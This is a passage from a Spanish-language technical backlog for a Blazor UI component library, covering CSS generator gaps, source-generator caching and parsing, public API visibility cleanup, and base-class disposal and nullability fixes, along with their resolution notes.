  2. Tokenizar dimensiones (`--bui-scrollbar-width`, `--bui-scrollbar-thumb-radius`) en `FeatureDefinitions.Tokens.Scrollbar`.
  3. Documentar en `CLAUDE.md` (alimenta `CLAUDE-03`) la política de estilos globales: bundle global = solo reset mínimo, tokens, clases con prefijo `bui-`; sin tocar selectores universales ni pseudo‑elementos del consumidor.

### `BLD-PIPE-09` — `CssInitializeThemesGenerator` genera clases utilitarias sin cobertura para toda la paleta ✅ RESUELTO (7bc562b)

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/CssInitializeThemesGenerator.cs:24‑80`.
- **Evidencia**: emite `.bui-color-*`/`.bui-bg-*` para `primary, secondary, success, warning, error, info`; nada para `surface, surface-contrast, background, background-contrast, highlight, border, hover-tint, white, black`. Asimétrico y propenso a errores al añadir un color a la paleta.
- **Criterios de aceptación**:
  1. Iterar programáticamente sobre `BUIThemePaletteBase.GetThemeVariables()` (misma fuente que `ThemesCssGenerator`) para emitir `.bui-color-<key>` y `.bui-bg-<key>` por cada clave de paleta.
  2. Evitar duplicar la clase `.bui-primary` / `.bui-secondary` (hoy redundantes con `bui-color-*` + `bui-bg-*`) salvo decisión explícita documentada.
  3. Alinear con §3.11 `THEME` y §3.8 `CSS-SCOPED`.
- **Resolución**: el generator reflexiona sobre las propiedades `CssColor` de `BUIThemePaletteBase` (misma fuente que `GetThemeVariables`) y emite `.bui-color-<key>` + `.bui-bg-<key>` para las 26 claves de paleta, ordenadas ordinalmente. Las combo classes legacy `.bui-primary`/`.bui-secondary` se eliminaron (criterio 2 — no hay callers en el repo). 2502 tests pasan.

### `BLD-PIPE-10` — `TransitionsCssGenerator` expande 51 selectores con combinadores pesados `:not(:has(:disabled))` sin variables `--bui-t-*` declaradas en tokens

- **Estado**: ✅ Resuelto parcialmente (commit `3e63956`, criterios 1-2) — `FeatureDefinitions.Tokens.Transitions` centraliza `TargetClass` (`transition-target`), `Shorthand` (`--bui-t-transition`), `VariablePrefix`, `Triggers[]`, `Props[]` y el helper `VariableFor(trigger, prop)`. `TransitionsCssGenerator` consume todo vía las constantes (tag, `data-bui-transitions`, clase target, shorthand, props, builder de vars) y también `BUITransitions.GetCssVariables()` deja de hardcodear el prefijo `--bui-t-` usando el helper. Criterio 2 (defaults en `_tokens.css`) descartado por diseño: las transiciones son opt-in por componente; un fallback global en `:root` aplicaría cambios visibles en cualquier componente que declare `data-bui-transitions` sin poblar las vars — comportamiento más dañino que el silencio actual. Comentario inline en `Transitions` documenta la decisión. Criterios 3 (selector compuesto por trigger) y 4 (antes/después bytes en `CSS-OPT-xx`) quedan como follow-up — la compactación requiere rethink (cada prop necesita su propia declaración `<prop>: var(…)`; un único selector compuesto por trigger agruparía las 17 reglas pero no reduce LoC de declaraciones). `_transition-classes.css` byte-idéntico al baseline. 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/TransitionsCssGenerator.cs`.
- **Evidencia**:
  - 3 triggers × 17 propiedades = 51 bloques con doble selector `bui-component[data-bui-transitions~="…"]<childPseudo> .transition-target, bui-component[data-bui-transitions~="…"].transition-target<selfPseudo>`. Cada uno invoca `var(--bui-t-<trigger>-<prop>)` **sin fallback**.
  - `:not(:has(:disabled))` es caro y está duplicado en cada regla hijo.
  - Tokens `--bui-t-*` no se generan en `_tokens.css`.
  - Literales `"hover"`, `"focus"`, `"active"`, `"data-bui-transitions"`, `".transition-target"` no provienen de `FeatureDefinitions`.
- **Criterios de aceptación**:
  1. Declarar en `FeatureDefinitions.Tokens.Transitions` los nombres de trigger, los props soportados, la clase `transition-target` y el atributo `data-bui-transitions`.
  2. Generar en `_tokens.css` (o un `_transitions-tokens.css` nuevo) las variables por defecto `--bui-t-<trigger>-<prop>` con fallback sensato; medir el impacto si no se declaran (sin default los `var()` no resuelven y la propiedad se ignora — comportamiento hoy).
  3. Considerar emitir un único selector compuesto por trigger (`bui-component[data-bui-transitions*="hover:"]…`) en lugar de un selector por combinación trigger×prop — reduce nº de reglas y facilita purge.
  4. Alimentar `CSS-OPT-xx` con el antes/después (bytes).

### `BLD-PIPE-11` — `InputFamilyCssGenerator` tiene variable muerta `addonSuffix` y reglas asimétricas prefix vs suffix ✅ RESUELTO (4270242)

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/InputFamilyCssGenerator.cs:38, 208‑218`.
- **Evidencia**: el generator resuelve `FeatureDefinitions.CssClasses.Input.AddonSuffix` y lo asigna a la variable local `addonSuffix`, pero el resto del archivo solo estiliza `addonPrefix`. El warning CS0219 (`BLD-13`) es la consecuencia; el problema de fondo es que **los componentes que usan suffix no reciben CSS**. No hay `:has(.addonSuffix)` ni overrides por variante.
- **Criterios de aceptación**:
  1. Emitir las reglas simétricas para `addonSuffix` (reflejo de `addonPrefix` con `order` y `border-*` invertidos).
  2. Añadir tests de render que verifiquen que un input con `PrefixIcon` y otro con `SuffixIcon` reciben layout correcto en las tres variantes (outlined/filled/standard).
  3. Cierra `BLD-13` si la variable pasa a consumirse.
- **Resolución**: se añaden bloques espejo para `addonSuffix` en base (`order: 1`, `border-inline-start`, token `--_addon-offset-end`), outlined (`border-start-end-radius` + `border-end-end-radius`) y filled (`border-start-end-radius`). CS0219 desaparece → BLD-13 cerrada por colateral. Los 2502 tests de integración siguen pasando. El CSS regenerado incluye ahora 8 reglas `addon--suffix` pareadas con las 8 de `addon--prefix`. Criterio 2 (tests específicos de `SuffixIcon`) queda como follow-up menor — la reflexión `IHas*` ya cubre la emisión del atributo y el render no rompe.

### `BLD-PIPE-12` — `InputFamilyCssGenerator` y `PickerFamilyGenerator` usan literales en vez de tokens para timings, radios y tamaños base

- **Estado**: ✅ Resuelto (commit `528aecc`) — `FeatureDefinitions.Tokens.{Input,Picker}` añaden 7 tokens nuevos: Input `Radius` (4px), `TransitionDuration`/`TransitionEasing` (split para poder overridearlos por separado), `FloatedScale` (0.75); Picker `Radius` (8px), `CellSize` (36px), `Padding` (0.75rem). `DesignTokensGenerator` emite las 7 vars en `:root` dentro de `_tokens.css` → consumidor puede sobreescribir cualquiera globalmente sin tocar CSS scoped. `InputFamilyCssGenerator` reescribe `--_input-radius`/`--_input-transition`/`--_input-scale` para resolver de los tokens globales; `PickerFamilyGenerator` idem con padding/radius/cell-size. Criterio 3 cumple por diseño: el `.razor.css` no se tocó, la cascada ahora va `--bui-* token → --_family-* privado → CSS consumer`. Literales restantes (32px button, 3.5rem input height, 14px slider, rgba slider shadow) quedan fuera de scope — eran no mencionados en la evidencia y tokenizarlos inflaría la superficie pública. 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**:
  - `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/InputFamilyCssGenerator.cs:65‑88` (`--_input-radius: 4px`, `--_input-transition: 150ms cubic-bezier(...)`, `--_input-scale: 0.75`, etc.).
  - `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/PickerFamilyGenerator.cs:42‑49` (`padding: calc(0.75rem * ...)`, `border-radius: 8px`, `--_cell: calc(36px * ...)`, etc.) y `.slider::after` con `rgba(0,0,0,0.2)`.
- **Evidencia**: regla 6 de CLAUDE ("Colores vía `--palette-*`", extendible a dimensiones y timings del sistema). Consumidores no pueden sobreescribir los valores base.
- **Criterios de aceptación**:
  1. Promover cada literal a `FeatureDefinitions.Tokens.*` (`InputRadius`, `InputTransition`, `PickerCellSize`, `PickerRadius`…).
  2. Los generators consumen las constantes; el CSS declara la variable en `_tokens.css` con su default, y cada family override la puede heredar.
  3. Consumidor puede sobreescribir `--bui-input-radius` globalmente sin tocar `.razor.css`.

### `GEN-03` — `ComponentInfoGenerator` parsea `@namespace`/`@inherits`/`@code` con regex + conteo manual de llaves: brittle frente a C# moderno

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/ComponentInfoGenerator.cs:160-298` (`RazorParser.Parse`, `ExtractCodeBlock`).
- **Evidencia**: `ExtractCodeBlock` cuenta llaves escapando strings `"..."` y `'...'` con `prev != '\\'`. No maneja: raw strings `"""..."""`, interpolated strings `$"..."` (pueden contener `{` `}` literales en holes), verbatim strings `@"..."` (el escape es `""` no `\"`), escape sequences Unicode `'\u007B'`, cadenas interpolated-verbatim `@$"..."`/`$@"..."`. Un `@code` con cualquiera de estos provocará recuento erróneo de llaves y truncado/expansión del bloque.
  - Ejemplo concreto: `@code { private string X = $"{{"; [Parameter] public int A { get; set; } }` corta antes del cierre real.
- **Criterios de aceptación**:
  1. Reemplazar `ExtractCodeBlock` por un parseo basado en el tokenizador C# real: wrap del razor en una clase, usar `CSharpSyntaxTree.ParseText` y buscar el último `MethodDeclaration`/`BlockSyntax` del bloque. Alternativa ligera: delegar en `Microsoft.AspNetCore.Razor.Language` (el mismo parser que usa Blazor).
  2. Tests de regresión con raw strings, interpolated strings, verbatim strings, char escapes.
  3. Si se mantiene el parser manual, documentar explícitamente las limitaciones y emitir diagnostic `BUIGEN002` cuando se detecten secuencias no soportadas.
- **Notas**: la biblioteca actual no usa raw strings en `@code`, pero el 1.0 público expone este generator indirectamente (docs, y potencialmente consumidores si se empaqueta) — el riesgo existe aguas abajo.

### `GEN-04` — `ComponentInfoGenerator` combina `Compilation` con la colección completa de razors: cache se invalida en cada keystroke del IDE

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/ComponentInfoGenerator.cs:113-150`.
- **Evidencia**: `allRazorFiles.Combine(context.CompilationProvider)` → `RegisterSourceOutput`. `Compilation` cambia con cada edición del IDE, forzando la regeneración para los 30+ razors marcados aunque no haya cambiado ninguno de ellos. El nodo `allRazorFiles` mismo usa `Collect()` sobre AdditionalTexts, lo que ya de por sí es costoso.
- **Criterios de aceptación**:
  1. Separar los providers: los razors como `IncrementalValuesProvider<RazorFileData>` (por-archivo, cacheable individualmente), y un `IncrementalValueProvider<ImmutableDictionary<string, RazorFileData>>` derivado con `.Collect().Select(build razor map)` para resolución de herencia.
  2. La resolución de bases .cs via `Compilation` debe consultarse sólo cuando sea necesaria, idealmente en un transform separado que combine sólo el razor actual + el map + `Compilation` (no la colección completa).
  3. Idealmente: `RazorFileData` con `IEquatable` estructural (ya lo es por ser `record`) evita regeneración per-file cuando el contenido no cambió.
  4. Benchmark: editar una propiedad en un componente razor → sólo se regenera su `*ComponentInfo.g.cs`; otros ~30 deben mantener cache.
- **Notas**: los source generators que usan `Compilation` directamente son anti-pattern salvo que se resuelvan tipos .cs; aquí sólo se usa para `FindType` sobre bases heredadas. Considerar sustituir por un `SyntaxProvider` sobre clases con `[Parameter]` para extraer bases sin leer toda la Compilation.

### `GEN-05` — `ComponentInfoGenerator` resuelve bases por nombre simple: colisiones silenciosas + `GetSymbolsWithName` O(n)

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/ComponentInfoGenerator.cs:130-136,395-405,447-470`.
- **Evidencia**:
  1. `razorMap = new Dictionary<string, RazorFileData>(StringComparer.Ordinal)` — clave es el **nombre simple** del archivo (`Path.GetFileNameWithoutExtension`). Comentario reconoce que "gana el primero encontrado; ese escenario es un error de diseño del proyecto" pero no emite diagnostic. Dos `BUIButton.razor` en carpetas distintas → uno desaparece silenciosamente.
  2. `FindType(compilation, simpleName)` itera toda la Compilation via `GetSymbolsWithName` cada vez que se resuelve una base .cs — llamado una vez por componente con base en .cs.
  3. `ExtractSimpleName` pierde el namespace: si dos tipos `Foo.BaseX` y `Bar.BaseX` coexisten, `FindType` devuelve el primero que Roslyn encuentra → parámetros heredados del tipo equivocado.
- **Criterios de aceptación**:
  1. Resolver `@inherits` con su namespace completo cuando esté presente. Para bases .cs: usar `Compilation.GetTypeByMetadataName("Namespace.TypeName")` si el razor `@using` + `@inherits` lo permiten inferir.
  2. Si el nombre es ambiguo (múltiples candidatos tras filtrar por namespace imports declarados), emitir diagnostic `BUIGEN001` y saltar el archivo (o documentar el comportamiento determinista de desempate).
  3. Para el razorMap, cambiar la clave a `(Namespace, ComponentName)` y fallar con diagnóstico cuando se detecte colisión real.
  4. Tests: dos componentes con el mismo nombre en namespaces distintos; base .cs con nombre ambiguo.

### `API-04` — `VariantRegistry` concreta es `public sealed class` y `BehaviorConfiguration`/`RippleConfiguration` son DTOs públicos de interop

- **Estado**: ✅ Resuelto (commit `5816ac8`)
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Services/VariantRegistry.cs:8` — `public sealed class VariantRegistry : IVariantRegistry`.
  - `src/CdCSharp.BlazorUI.Core/Abstractions/Behaviors/Javascript/IBehaviorJsInterop.cs:11,17` — `public class BehaviorConfiguration`, `public class RippleConfiguration`.
- **Evidencia**:
  1. `VariantRegistry` se consume via `IVariantRegistry`. Su constructor recibe `IEnumerable<IVariantRegistryInitializer>` — DI-only. Pública: consumidores podrían instanciarla fuera de DI, duplicando estado. Hacer `internal` evita ese mal uso y libera refactor interno.
  2. `BehaviorConfiguration`/`RippleConfiguration` son payloads serializados a JS. Consumidor nunca los construye — los emite `BUIComponentJsBehaviorBuilder` desde las props del componente. Exponerlos cementa la forma del JSON JS-interop y bloquea cambios (añadir un campo requiere bump).
- **Criterios de aceptación**:
  1. `VariantRegistry` → `internal sealed class`.
  2. `BehaviorConfiguration` / `RippleConfiguration` → `internal sealed class`.
  3. Si algún test aún instancia directamente estos tipos, refactorizar para resolver `IVariantRegistry` del `ServiceProvider` y para configurar ripple via el componente.
  4. `InternalsVisibleTo("CdCSharp.BlazorUI.Tests.Integration")` ya existe — no se requieren cambios adicionales.

### `API-05` — Superficie del módulo `DateTimePattern` expuesta sin historia de usuario estable: 9 tipos públicos de plumbing

- **Estado**: ✅ Resuelto (commit `207f3cf`) — nota: `BUIBasePattern`, `BUIDateTimePattern`, `PatternState`, `SpanState` permanecen `public` por restricción del Razor SDK (genera `public partial class` siempre); marcados con `[EditorBrowsable(Never)]` para ocultar de IntelliSense. El resto (`DateComponent`, `DateComponentType`, `DateComponentValidator`, `DatePatternParser`, `ParsedDatePattern`, `IPatternJsCallback`) son `internal`.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Utils/Patterns/DateTimePattern/*.cs` y `Abstractions/*.cs`:
  - `DateComponent`, `DateComponentType`, `DateComponentValidator`, `DatePatternParser`, `ParsedDatePattern`.
  - `BUIBasePattern` (abstract), `PatternState`, `SpanState`.
  - `PatternJsInterop` (concreto), `IPatternJsInterop` (OK), `IPatternJsCallback` (OK), `PatternCallbacksRelay`.
- **Evidencia**: estos tipos implementan el sistema de máscaras que usa `BUIInputDateTime`. No hay API documentada "construye tu propio componente con patrón" en `CLAUDE.md`; no hay tests de consumidor extendiendo `BUIBasePattern`. Publicar los 9 tipos compromete SemVer a refactors internos (renombrar `SpanState.Intersects`, cambiar signature de `DateComponentValidator.Validate`, etc.).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-07]** Opción B: todos los tipos plumbing pasan a `internal`. Orden: `DatePatternParser`, `DateComponentValidator`, `ParsedDatePattern`, `DateComponent`, `DateComponentType`, `SpanState`, `PatternState`, `PatternCallbacksRelay`, `PatternJsInterop`.
  2. `BUIBasePattern` pasa a `internal abstract class` (no hay escenario documentado de consumidor extendiéndolo; re-evaluable en 2.0 si surge).
  3. `DateTimeTokenHelper` y cualquier conversor de pattern `.NET ↔ intl` auxiliar también `internal`.
  4. Documentar decisión en `CLAUDE.md` → `CLAUDE-xx`.
- **Notas**: mismo patrón de "internal surface" que `API-02`. Relacionado con `API-06`. Decisión D-07 (ver §Directivas de diseño): helpers de fecha no se exponen públicamente en 1.0.

### `API-06` — 4 `CallbacksRelay` sellados expuestos como API pública: puro pegamento JS-interop

- **Estado**: ✅ Resuelto (commit `9bb15ae`)
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/JsInterop/DropdownCallbacksRelay.cs:6` — `public sealed class DropdownCallbacksRelay : IDisposable`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/JsInterop/ModalCallbacksRelay.cs:6` — `public sealed class ModalCallbacksRelay`.
  - `src/CdCSharp.BlazorUI/Components/Utils/Draggable/JsInterop/DraggableCallbacksRelay.cs:6` — `public sealed class DraggableCallbacksRelay`.
  - `src/CdCSharp.BlazorUI/Components/Utils/Patterns/JsInterop/PatternCallbacksRelay.cs:6` — `public sealed class PatternCallbacksRelay`.
- **Evidencia**: cada uno es un wrapper `DotNetObjectReference`-capable que reenvía callbacks JS a la interface `I*JsCallback` del componente que lo instancia. No hay razón para consumidor: los componentes `BUIInputDropdown`, `BUIDialog`, `BUIDraggable`, `BUIInputDateTime` los crean internamente.
- **Criterios de aceptación**:
  1. Todos a `internal sealed class`.
  2. `InternalsVisibleTo` ya cubre tests.
  3. Ningún test consumidor los debe instanciar directamente.

### `API-07` — Namespace-splitting en Core incoherente: mezcla `CdCSharp.BlazorUI.Components` con `CdCSharp.BlazorUI.Core.*`

- **Estado**: ✅ Resuelto (commit `2649b5d`) — 3 namespaces públicos definitivos: `CdCSharp.BlazorUI.Components`, `CdCSharp.BlazorUI.Abstractions`, `CdCSharp.BlazorUI.Themes`. Todos los `CdCSharp.BlazorUI.Core.*` eliminados del espacio público (el nombre del assembly `CdCSharp.BlazorUI.Core` permanece sin cambios — es ortogonal al namespace).
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: proyecto `src/CdCSharp.BlazorUI.Core/` — 9 namespaces distintos.
- **Evidencia**: `grep -r "^namespace"` devuelve en Core:
  - `CdCSharp.BlazorUI.Components` — `FeatureDefinitions`, `IBehaviorJsInterop`, `BehaviorConfiguration`, `IHas*`, familia `I*FamilyComponent`, `BUIIcons`.
  - `CdCSharp.BlazorUI.Core.Abstractions.{Components,JSInterop,Services}` — `BUIComponentBase`, `ModuleJsInteropBase`, `IVariantRegistry`.
  - `CdCSharp.BlazorUI.Core.Components{,.Selection}` — `BUIInputComponentBase`, `SelectionState`.
  - `CdCSharp.BlazorUI.Core.Diagnostics`, `Core.Themes`, `Core.Theming.Abstractions`.
  
  No hay regla consistente: algunos tipos marcan `.Core.` y otros no. Tipos críticos (`BUIComponentBase` vs `IHasSize`) viven en raíces distintas obligando a `using CdCSharp.BlazorUI.Components;` + `using CdCSharp.BlazorUI.Core.Abstractions.Components;` en cada archivo consumidor. El valor de `FeatureDefinitions` vivir en `CdCSharp.BlazorUI.Components` es claro (consumer-facing debe estar ahí) pero entonces **todo** lo consumer-facing debería estarlo.
- **Criterios de aceptación**:
  1. Definir 2–3 namespaces públicos estables:
     - `CdCSharp.BlazorUI.Components` (componentes, enums, variants, eventos).
     - `CdCSharp.BlazorUI.Abstractions` o similar (bases para extender: `BUIComponentBase`, `BUIInputComponentBase`, `BUIVariantComponentBase`, `Variant`, familias, `IHas*`).
     - `CdCSharp.BlazorUI.Themes` (paletas y `BUIThemePaletteBase`).
     Todo lo demás → `internal`.
  2. Eliminar `CdCSharp.BlazorUI.Core.*` del espacio público (la palabra "Core" es un detalle de ensamblado, no de consumo).
  3. Alimenta `CLAUDE-xx`: fijar la regla "namespaces por consumidor, no por assembly" en `CLAUDE.md`.
  4. Este refactor debe ejecutarse antes del commit inicial de `PublicAPI.Shipped.txt` (`API-03`).
- **Notas**: mezcla afecta también a BlazorUI (`CdCSharp.BlazorUI.Components.Forms.*`, `Components.Layout.*`). Decidir política uniforme.

### `API-08` — Clases `Variant` mayoritariamente `public class` no selladas: inconsistencia dentro del mismo patrón

- **Estado**: ✅ Resuelto (commit `c3d3303`)
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: 13 archivos `*Variant.cs` bajo `src/CdCSharp.BlazorUI/Components/`.
- **Evidencia**:
  - `public sealed class`: `BUISelectVariant`, `BUIToastVariant` (2).
  - `public class` (no sellada): `BUIBadgeVariant`, `BUIButtonVariant`, `BUICardVariant`, `BUIInputCheckboxVariant`, `BUIInputRadioVariant`, `BUIInputSwitchVariant`, `BUIInputVariant`, `BUILoadingIndicatorVariant`, `BUISvgIconVariant`, `BUITabsVariant`, `BUIThemeSelectorVariant`, `DataCardsVariant`, `DataGridVariant` (13).
  
  El patrón de registro de variants (`ctx.Services.AddBlazorUIVariants(b => b.ForComponent<BUIButton>().AddVariant(BUIButtonVariant.Custom("X"), ...))`) no requiere subclase — se pasa una instancia. No hay caso de uso para `class MyCustom : BUIButtonVariant { }`.
- **Criterios de aceptación**:
  1. Sellar las 13 clases `*Variant` no selladas.
  2. Si alguna se deja no-sellada, justificarlo en XML doc explicando el escenario de subclase y añadir test de regresión.
  3. Revisar también `DialogOptions`, `DrawerOptions`, `ModalReference`, `ModalState` (ver `API-11`).

---

### `BASE-03` — Instrumentación `#if DEBUG` (perf tracking) presente solo en `BUIComponentBase`: inputs quedan fuera de telemetría

- **Estado**: ✅ Resuelto (commit `6793941`) — perf tracking movido a `BUIComponentPipeline` con hooks `BeginInit`/`EndInit`, `BeginParametersSet`/`EndParametersSet`, `BeginRenderTree`/`EndRenderTree`. Los métodos `Begin*` llevan `[Conditional("DEBUG")]` y los `End*` también; en Release las llamadas se eliden y los campos `Stopwatch` viven tras `#if DEBUG`, de modo que el coste en producción es 0. Ambos base classes (`BUIComponentBase` y `BUIInputComponentBase<TValue>`) delegan al pipeline. Los 14+ componentes de formulario pasan a reportar `RecordInit`/`RecordParametersSet`/`RecordRenderTreeBuild` al `IBUIPerformanceService` bajo DEBUG. Criterio 2 (test que verifique el mock de `IBUIPerformanceService` en ambos bases) queda como follow-up — cierra en conjunto con `COMP-LINT-01`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentBase.cs:15-23,55-127` vs `BUIInputComponentBase.cs` (sin equivalente).
- **Evidencia**: `BUIComponentBase` mide `OnInitialized`, `OnParametersSet`, `BuildRenderTree` y reporta a `IBUIPerformanceService`. `BUIInputComponentBase<TValue>` no inyecta `IBUIPerformanceService`, no arranca `Stopwatch`, no reporta nada. Resultado: 14+ componentes de formulario (text, number, datetime, checkbox, radio, switch, color, textarea, dropdown, …) son invisibles para el `DebugPanel` / servicio de performance en sesiones de DEBUG, justo los que tienen el pipeline de validación (normalmente los más caros).
- **Criterios de aceptación**:
  1. Replicar el bloque `#if DEBUG` en `BUIInputComponentBase<TValue>` (con el mismo `TrackPerformanceEnabled` parameter y `PerformanceService?.Record*`) **o** — preferible — eliminar la duplicación al cerrar `BASE-01`.
  2. Añadir test de integración que verifique que ambos bases llegan al mock de `IBUIPerformanceService` bajo DEBUG.
- **Notas**: una vez unificado el pipeline (`BASE-01`), esta tarea se resuelve automáticamente.

---

### `BASE-04` — `ComputedAttributes` con visibilidades inconsistentes entre bases: `public` en `BUIComponentBase`, `protected` en `BUIInputComponentBase<TValue>`

- **Estado**: ✅ Resuelto (commit `8a7526e`) — ambos base classes exponen `ComputedAttributes` como `public`. Se descartó `protected`: las plantillas de variantes (`Func<TComponent, RenderFragment>`) viven fuera del proyecto del componente y necesitan spread cross-assembly del diccionario para pintar la raíz `<bui-component>` (ver `TestVariantComponent_CustomVariants.razor` como ejemplo canónico). Añadido XML-doc en ambas bases explicando la razón.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentBase.cs:29` (`public`) vs `BUIInputComponentBase.cs:43` (`protected`).
- **Evidencia**: Para `BUIButton` (`BUIVariantComponentBase` → `BUIComponentBase`), `ComputedAttributes` es `public`: un test o componente externo puede hacer `cut.Instance.ComputedAttributes` y leer el diccionario. Para `BUIInputText` (`BUIInputComponentBase<TValue>`), la misma propiedad es `protected`: el acceso simétrico no existe. Esto fuerza a los tests a leer `cut.Find("bui-component")` siempre, pero rompe la simetría del contrato y sugiere fuga de encapsulación en `BUIComponentBase`.
- **Criterios de aceptación**:
  1. Decidir una única visibilidad. Recomendado: `protected` en ambos (el diccionario es detalle interno; el DOM ya se serializa con `@attributes="ComputedAttributes"`).
  2. Si `public` es intencional por compatibilidad con tests, documentarlo en XML-doc y replicarlo en el input base.
  3. Tests (`Tests/Core/BaseComponents/`) que lean `Instance.ComputedAttributes` deben seguir pasando (o migrarse a `cut.Find(...).GetAttribute(...)` si se decide `protected`).

---

### `BASE-05` — `IVariantRegistry` inyectado con nullability inconsistente: nullable en `BUIVariantComponentBase`, non-null (`default!`) en `BUIInputComponentBase<TValue, TComponent, TVariant>`

- **Estado**: ✅ Resuelto (commit `8a7526e`) — `BUIInputComponentBase<,,>` pasa a declarar `[Inject] private IVariantRegistry? VariantRegistry { get; set; }` (alineado con `BUIVariantComponentBase`). El criterio 1 aplica: `VariantHelper<,>` ya acepta `IVariantRegistry?`, así que ambas bases delegan tolerancia al helper. Criterio 3 (test DI sin `AddBlazorUI`) queda como follow-up — hoy ninguna base lanza NRE porque el helper tolera null.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIVariantComponentBase.cs:22` (`[Inject] private IVariantRegistry? VariantRegistry { get; set; }`) vs `BUIInputComponentBase.cs:211` (`[Inject] private IVariantRegistry VariantRegistry { get; set; } = default!;`).
- **Evidencia**: La DI de BlazorUI registra `IVariantRegistry` como singleton en `ServiceCollectionExtensions.AddBlazorUI`; si el consumidor omite `AddBlazorUI()`, la inyección falla. En `BUIVariantComponentBase` el `?` tolera silenciosamente esa omisión (y `VariantHelper` acepta `IVariantRegistry?`), pero en la rama de input la ausencia revienta con `NullReferenceException` desde el primer render. Además, `VariantHelper<,>` firma el parámetro como `IVariantRegistry?` (tolera null), por lo que `default!` en el input base es inconsistente con el contrato del helper.
- **Criterios de aceptación**:
  1. Alinear ambas inyecciones: dado que `VariantHelper` tolera null, usar `IVariantRegistry?` en ambas bases (y documentar que `AddBlazorUI()` es opcional pero recomendado).
  2. Alternativa: declarar `[Inject(Required=true)]` de verdad y validar en `OnInitialized` con mensaje claro si el servicio no está registrado.
  3. Añadir test de DI que monte solo lo mínimo (sin `AddBlazorUI()`) y rendere un `BUIInputText`: hoy probablemente lanza NRE, debe dar mensaje accionable.

---

### `BASE-06` — Ninguna base class usa el patrón `_disposed` para *gate* de continuaciones post‑await: viola `CLAUDE.md` "Disposable components"

- **Estado**: ✅ Resuelto (commit `3f34643`) — `BUIComponentBase` y `BUIInputComponentBase<TValue>` exponen `protected bool IsDisposed { get; set; }`. Las bases lo marcan en su propio `DisposeAsync`/`Dispose(true)` y gatean `OnAfterRenderAsync(firstRender)` antes del `await _pipeline.AttachBehaviorAsync(...)`; si llegó dispose durante el attach, el behavior recién creado se libera inmediatamente. `BUIInputComponentBase.HandleValidationStateChanged` también gatea en `IsDisposed`. Patrón documentado en `CLAUDE.md §"Async / JS interop conventions"` → "Disposable components". Migrados 5 componentes que tenían `_disposed` privado duplicado: `BUITabs`, `BUIToastHost`, `BUIDialog`, `BUIDrawer`, `BUITreeMenu`. Criterio 4 cubierto. 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `BUIComponentBase.DisposeAsync` (`:129-151`), `BUIInputComponentBase.DisposeAsync` (`:75-97`) + `Dispose(bool)` (`:99-107`).
- **Evidencia**: `CLAUDE.md` → "Async / JS interop conventions" → "if the component subscribes to `NavigationManager.LocationChanged`, registers children through cascading parameters, or holds a `CancellationTokenSource`, set a `_disposed` flag inside `DisposeAsync`/`Dispose` and gate any post-await continuations on it before touching component state". Ni `BUIComponentBase` ni `BUIInputComponentBase<TValue>` exponen un `protected bool IsDisposed` para sus derivadas, y ninguno de los dos lo verifica tras el `await` en `OnAfterRenderAsync(firstRender)` antes de asignar `_behaviorInstance = await BuildAndAttachAsync()`. En un escenario de circuito desconectado entre el `firstRender` y el resolve del `ValueTask`, `_behaviorInstance` se asigna tras el dispose y queda huérfano (el catch en `DisposeAsync` lo salva, pero con carga innecesaria).
- **Criterios de aceptación**:
  1. Introducir `protected bool IsDisposed { get; private set; }` en el base unificado (post `BASE-01`) o en ambos bases si se mantienen separados.
  2. Asignar `IsDisposed = true` al inicio de `DisposeAsync`/`Dispose(true)`.
  3. Gate al menos: `if (IsDisposed) return;` al entrar en `OnAfterRenderAsync(firstRender)` antes de tocar `_behaviorInstance`.
  4. Documentar el patrón en `CLAUDE.md` para las derivadas que tengan suscripciones (`NavigationManager.LocationChanged`, timers, `CancellationTokenSource`).
- **Notas**: efecto directo en `BUIToastHost`, `BUIDialog`, `BUIDrawer`, `BUITabs`, `BUITreeMenu` (los únicos 5 lugares con `_disposed` ya implementado manualmente — confirmar al cerrar que se migran al flag del base y no duplican lógica).

---

### `COMP-TOASTHOST-02` — `BUIToastHost` implementa `IDisposable` pero hereda `IAsyncDisposable` vía `BUIComponentBase`: `Dispose()` es dead code → event handler fuga

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:8,91-95`.
